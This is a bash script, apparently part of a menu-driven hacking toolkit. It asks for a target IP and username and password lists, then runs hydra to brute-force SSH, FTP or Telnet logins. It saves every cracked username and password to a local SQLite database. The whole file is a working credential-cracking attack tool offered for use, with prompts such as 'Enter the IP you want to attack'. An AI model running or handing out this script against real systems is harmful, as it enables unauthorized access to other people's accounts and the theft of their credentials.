#!/bin/bash
# Text Format
bluetxt="\033[1;34m"
cyantxt="\033[1;36m"
greentxt="\033[1;37m"
whitetxt="\033[1;37m"
redtxt="\033[1;31m"
nocolor="\033[0m"
# Symbol Format
grenaro="\033[0;32m➤ "
redaro="\033[0;31m➤ "
# Backend Variables
ip=""
task=""
shell="22"
filetran="21"
telnets="23"
userfile=""
passfile=""
custom=""
database="data/database.db"
password=()
username=()
while [[ !("$task" =~ "Back To Main Menu") ]]
do
	# Ask the IP of the system to attack.
	echo -e "${grenaro}${whitetxt}Enter the IP you want to attack."
	read ip
	# Ask the location of the password/username files.
	echo -e "${grenaro}${whitetxt}Enter the file path of your username list or type the username."
	read userfile
	echo -e "${grenaro}${whitetxt}Enter the file path of your password list."
	read passfile
	# Menu to display different services.
	echo -e "${grenaro}${whitetxt}What type of service would you like to attack?"
	select task in "SSH" "FTP" "Telnet" "Back To Main Menu"
	do
		if [[ $task = "SSH" ]]; then
			hydra -o data.txt -q ssh://$ip:$shell -l $userfile -P $passfile &>/dev/null &
			PID=$!
			i=1
			sp="/-\|"
			echo -e "${grenaro}${whitetxt}attacking..."
			# Loading animation.
			echo -n ' '
			while [ -d /proc/$PID ]
			do
				printf "\b${sp:i++%${#sp}:1}"
				sleep .5
			done
			echo ""
			# Loop the file for all the stored password/usernames in data.txt. Then put the passwords into the database.
			while IFS= read -r line; do
				password=$(echo "$line" | grep -o -P '(?<=password: ).*')
				username=$(echo "$line" | grep -o -P '(?<=login: )[[:alnum:]_]+')
				# Check for empty variables.
				if [[ $password != "" ]] && [[ $username != "" ]]; then
					sqlite3 "$database" "INSERT INTO hydra (ip, servicename, password, username) VALUES ('$ip', 'ssh', '$password', '$username');"
				fi
			done < data.txt
			rm data.txt
			echo -e "${grenaro}${whitetxt}Your brute force attack is complete. Going back to main menu..."
			sleep 4
			exit
		elif [[ $task = "FTP" ]]; then
			hydra -o data.txt -q ftp://$ip:$filetran -l $userfile -P $passfile &>/dev/null &
			PID=$!
			i=1
			sp="/-\|"
			echo -e "${grenaro}${whitetxt}attacking..."
			# Loading animation.
			echo -n ' '
			while [ -d /proc/$PID ]
			do
				printf "\b${sp:i++%${#sp}:1}"
				sleep .5
			done
			echo ""
			# Loop the file for all the stored password/usernames in data.txt. Then put the passwords into the database.
			while IFS= read -r line; do
				password=$(echo "$line" | grep -o -P '(?<=password: ).*')
				username=$(echo "$line" | grep -o -P '(?<=login: )[[:alnum:]_]+')
				# Check for empty variables.
				if [[ $password != "" ]] && [[ $username != "" ]]; then
					sqlite3 "$database" "INSERT INTO hydra (ip, servicename, password, username) VALUES ('$ip', 'ftp', '$password', '$username');"
				fi
			done < data.txt
			rm data.txt
			echo -e "${grenaro}${whitetxt}Your brute force attack is complete. Going back to main menu..."
			sleep 4
			exit
		elif [[ $task = "Telnet" ]]; then
			hydra -o data.txt -q telnet://$ip:$telnets -l $userfile -P $passfile &>/dev/null &
			PID=$!
			i=1
			sp="/-\|"
			echo -e "${grenaro}${whitetxt}attacking..."
			# Loading animation. inetutils-inetd
			echo -n ' '
			while [ -d /proc/$PID ]
			do
				printf "\b${sp:i++%${#sp}:1}"
				sleep .5
			done
			echo ""
			# Loop the file for all the stored password/usernames in data.txt. Then put the passwords into the database.
			while IFS= read -r line; do
				password=$(echo "$line" | grep -o -P '(?<=password: ).*')
				username=$(echo "$line" | grep -o -P '(?<=login: )[[:alnum:]_]+')
				# Check for empty variables.
				if [[ $password != "" ]] && [[ $username != "" ]]; then
					sqlite3 "$database" "INSERT INTO hydra (ip, servicename, password, username) VALUES ('$ip', 'telnet', '$password', '$username');"
				fi
			done < data.txt
			rm data.txt
			echo -e "${grenaro}${whitetxt}Your brute force attack is complete. Going back to main menu..."
			sleep 4
			exit
		elif [[ $task = "Back To Main Menu" ]]; then
			break
		else
			echo -e "${redaro}${redtxt}Not a valid input.${whitetxt}" # Error out the user if input is not correct.
		fi
	done
done
